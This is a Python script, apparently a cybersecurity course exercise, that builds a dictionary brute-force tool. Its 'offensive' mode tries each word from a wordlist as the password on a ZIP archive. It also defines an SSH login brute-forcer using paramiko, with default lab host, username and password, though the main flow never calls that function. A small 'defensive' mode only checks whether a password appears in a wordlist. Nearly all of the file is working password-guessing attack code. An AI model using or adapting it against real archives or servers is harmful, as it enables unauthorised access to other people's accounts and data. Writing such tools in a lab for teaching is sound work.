#!/usr/bin/env python3 

# Script Name:                          opschallenge17.py
# Author name:                          Tianna Farrow
# Date of latest revision:              01/30/2024
# Purpose:                              Continue to develop a custom tool that performs brute force attacks 
# Execution:                            python3 opschallenge17.py
# Additional Resources:                 https://github.com/raqueltianna/ops-401/blob/main/opschallenge16.py; https://github.com/raqueltianna/ops-401/blob/main/opschallenge17.py; https://docs.python.org/3/library/zipfile.html#module-zipfile; https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-18/challenges/DEMO.md; https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/; https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/; https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-17/challenges/DEMO.md
# Notes:                                This is a continuation from a script that I started yesterday. I have linked that script into the resources and the resources in that script apply to this one as well. 

import paramiko
import getpass
import time
import zipfile

# Prompt user to select mode 
def offensive_mode():
    # ask user for path of the word file 
    word_list_path = input("Enter the path to the word list file: ")
    # ask user for how long of a delay 
    delay = float(input("Enter the delay between words: "))
    
    # open the word file and iterate through each line
    with open(word_list_path, 'r') as file:
        for line in file:
            word = line.strip()
            time.sleep(delay)
            # print current word 
            print(f"Current: {word}")

            # Add the ZIP file brute force functionality
            zip_brute_force("encrypted.zip", word)

def defensive_mode():
    # ask user to put in password or string 
    user_string = input("Enter a password to search: ")
    word_list_path = input("Enter the path to the word list file: ")
    
    with open(word_list_path, 'r') as file:
        word_list = [line.strip() for line in file]
    
    if user_string in word_list:
        print("The string is in the word list.")
    else:
        print("The string is not in the word list.")

def get_host():
    host = input('Enter an SSH Client to connect to or enter for default: ') or "192.168.12.211"
    return host

def get_user():
    user = input("Enter a username or enter for default: ") or "darthvader"
    return user

def get_password():
    password = getpass.getpass(prompt="Please provide a password:") or "password1234"
    return password

def ssh_brute_force(ip, username, password, delay):
    # Add the SSH brute force functionality
    with paramiko.SSHClient() as client:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        time.sleep(delay)

        try:
            client.connect(ip, username=username, password=password)
            print(f"Successful login! Username: {username}, Password: {password}")
        except paramiko.AuthenticationException:
            print(f"Failed login attempt with Password: {password}")
        except Exception as e:
            print(f"Error: {e}")

def zip_brute_force(zip_file_path, password_attempt):
    # Add the ZIP file brute force functionality
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        try:
            zip_file.extractall(pwd=password_attempt.encode('utf-8'))
            print(f"Successful extraction! Password: {password_attempt}")
        except Exception as e:
            # Ignore incorrect password attempts
            pass

if __name__ == "__main__":
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    
    mode = input("Enter the mode (1 or 2): ")

    if mode == '1':
        offensive_mode()
    elif mode == '2':
        defensive_mode()
    else:
        print("Invalid mode. Please enter 1 or 2.")